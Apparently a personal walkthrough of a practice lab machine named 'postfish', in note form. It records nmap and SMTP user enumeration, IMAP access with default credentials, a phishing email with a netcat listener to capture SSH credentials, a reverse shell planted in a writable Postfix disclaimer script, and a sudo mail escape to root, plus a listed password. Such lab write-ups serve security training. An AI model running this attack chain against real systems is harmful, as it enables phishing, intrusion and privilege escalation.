### Enumeration
```
IP=192.168.170.137
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,25,80,110,143,993,995 -A $IP
```
### Ports 
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- 25
	- smtpd
- 80
	- Apache httpd 2.4.41 ((Ubuntu))
- 110
	- Dovecot pop3d
- 143
	- Dovecot imapd
- 993
	- ssl/imap Dovecot imapd
- 995
	- ssl/pop3 Dovecot pop3d
### Foothold
- 25
	- nmap -p25 --script smtp-open-relay $IP -v
		- Server doesn't seem to be an open relay, all tests failed
	- nmap --script smtp-enum-users $IP
		- root
		- claire.madison
		- brian.moore
		- mike.ross
		- sarah.lorem
	- smtp-user-enum -U custom-wordlist.txt -t postfish.off
		- Sales
		- Legal
	- known user names
		- Sales
		- Legal
		- root
		- claire.madison
		- brian.moore
		- mike.ross
		- sarah.lorem
- 110
	- nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p110,995 $IP
- 143
	- Check login
		- curl -k 'imaps://192.168.170.137/INBOX?ALL' --user sales:sales
		- ![[Pasted image 20240715084233.png]]
		- legal gives login denied and sales does not
	- View mail
		- curl -k 'imaps://192.168.170.137/INBOX;MAILINDEX=1' --user sales:sales
		- ![[Pasted image 20240715084257.png]]
		- New email:  it@postfish.off
	- Send fake email to an employee to spoof the password
		- nc -lvnp 80
		- `sendemail -t brian.moore@postfish.off -f it@postfish.off -s postfish.off -u "Password Reset" -o tls=no
		- Then type malicious email, and have http://A_IP/
		- Should receive creds shortly
		- Supposed to receive SSH creds for brian
			- EternaLSunshinE  found in walkthrough
- 80
	- Resolved to postfish.off
	- Default landing page
		- ![[Pasted image 20240715073126.png]]
	- Team
		- Claire Madison
		- Mike Ross
		- Brian Moore
		- Sarah Lorem
		- Create wordlist with first name + last, first, last, first.last,first initial + last
		- cewl http://postfish.off/team.html > custom-wordlist.txt
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
			- nothing
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
### PE
#### Linux
- brian.moore
	- id
		- uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
	- sudo -l
		- can't run sudo
	- uname -a
		- `Linux postfish 5.4.0-64-generic #72-Ubuntu SMP Fri Jan 15 10:27:54 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`
	- getcap -r / 2>/dev/null
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- brian.moore
		- claire.madison
		- mike.ross
		- sarah.lorem
		- sales
	- linpeas
		- Readable files belonging to root and readable
			- Adds a disclaimer and runs code when email is sent
			- -rwxrwx--- /etc/postfix/disclaimer
			- Add bash reverse shell to the code
				- ![[Pasted image 20240715093545.png]]
			- Send an email and we get rev shell
				- ![[Pasted image 20240715093557.png]]
- filter
	- id
		- uid=997(filter) gid=997(filter) groups=997(filter)
	- sudo -l
		- (ALL) NOPASSWD: /usr/bin/mail *
		- gtfobins
			- `sudo mail --exec='!/bin/sh'`
			- sudo /usr/bin/mail --exec='!/bin/sh'
			- gives us root
### Credentials
- brian.moore:EternaLSunshinE
### Lessons Learned